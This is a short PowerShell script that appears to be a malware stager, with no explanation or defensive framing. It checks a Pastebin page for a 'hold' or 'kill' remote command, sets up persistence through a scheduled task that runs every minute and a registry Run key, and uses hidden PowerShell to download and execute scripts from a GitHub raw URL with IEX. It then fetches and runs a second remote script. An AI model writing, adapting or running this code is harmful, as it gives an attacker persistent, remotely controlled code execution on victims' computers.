$response = IWR 'https://pastebin.com/raw/Wy2fMXaw'

if ($response.Content -match 'hold') {
    Exit
}

if ($response.Content -match 'kill') {
    schtasks /Delete /TN "Start" /f
    reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Start" /f
    Exit
}

schtasks /Create /TN "Start" /SC MINUTE /MO 1 /TR "cmd /b /c powershell -w hi -c \""IEX(IWR https://raw.githubusercontent.com/rindonbrg/repo/master/repo1.ps1 -UseBasicParsing)""" /F

reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Start" /t REG_SZ /d "cmd /b /c powershell -w hi -c \""IEX(IWR https://raw.githubusercontent.com/rindonbrg/repo/master/repo1.ps1 -UseBasicParsing)\""" /F

$re = (IWR "https://pastebin.com/raw/MXcGBCqS"); IEX "IEX(IWR https://raw.githubusercontent.com/rindonbrg/repo/master/repo.ps1 -UseBasicParsing); repo $re"
